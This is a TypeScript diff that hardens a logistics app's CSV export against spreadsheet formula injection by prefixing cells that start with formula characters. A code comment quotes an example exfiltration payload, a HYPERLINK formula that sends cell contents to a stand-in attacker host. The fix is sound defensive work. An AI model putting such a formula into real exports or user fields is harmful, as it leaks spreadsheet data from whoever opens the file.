@@ -81,11 +81,18 @@ function toIsoTo(d: string): string | undefined {
   return new Date(`${d}T23:59:59.999`).toISOString();
 }
 
-/** CSV-safe escape: wrap every field in quotes, double inner quotes. Handles
- *  commas + quotes + newlines uniformly (the only RFC4180-safe approach). */
+/** CSV-safe escape: defang Excel/Sheets formula evaluation, then RFC4180-quote.
+ *  Cells starting with `=`, `+`, `-`, `@`, `\t`, or `\r` are treated as formulas
+ *  by Excel/Google Sheets — a logistics user could write a movement note like
+ *  `=HYPERLINK("http://attacker/?leak="&A1,"OK")` and another user opening the
+ *  CSV in Excel would trigger formula execution. Prefix with single-quote `'`
+ *  to force text mode. See: https://owasp.org/www-community/attacks/CSV_Injection
+ *  Then wrap every field in quotes + double inner quotes for RFC4180. */
 function csvEscape(value: unknown): string {
-  const s = value == null ? "" : String(value);
-  return `"${s.replace(/"/g, '""')}"`;
+  const raw = value == null ? "" : String(value);
+  const FORMULA_LEAD = /^[=+\-@\t\r]/;
+  const safe = FORMULA_LEAD.test(raw) ? `'${raw}` : raw;
+  return `"${safe.replace(/"/g, '""')}"`;
 }
 
 export default function LogisticsMovements({ initialFilters, setTab, clearInitialFilters }: Props) {
